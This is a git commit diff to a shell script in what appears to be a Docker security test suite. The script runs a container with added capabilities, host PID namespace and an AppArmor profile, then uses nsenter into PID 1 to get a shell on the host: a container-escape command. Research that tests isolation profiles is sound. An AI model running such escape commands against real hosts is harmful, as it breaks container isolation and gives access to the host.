447b82e72942aa5833e6a83a6a160945ece57941
Ubuntu <ubuntu@docker-security13.novalocal>
2018-10-15 23:32:12 +0000

    Trying to put some things in order for mount

--- Docker_tests/mount/attack_host_to_container/attack_to_host/7_run.sh
+++ Docker_tests/mount/attack_host_to_container/attack_to_host/7_run.sh
@@ -1,3 +1,6 @@
 #!/bin/sh
 
-docker run --rm -it --name=client --cap-add SYS_CHROOT --cap-add SYS_ADMIN --cap-add SYS_PTRACE --pid=host --security-opt "apparmor=client_profile" debian:latest nsenter -t 1 -u -n -i sh
+docker run --rm -it --name=client --pid=host --cap-add NET_ADMIN --cap-add SYS_PTRACE --cap-add SYS_ADMIN --security-opt "apparmor=client_profile" debian:latest nsenter -t 1 -n sh
+
+#Me auta ta capabilities to --pid=host einai pleon peritto
+#docker run --rm -it --name=client --cap-add SYS_PTRACE --cap-add SYS_CHROOT --cap-add SYS_ADMIN --security-opt "apparmor=client_profile" debian:latest nsenter -t 1 -u -n -i sh
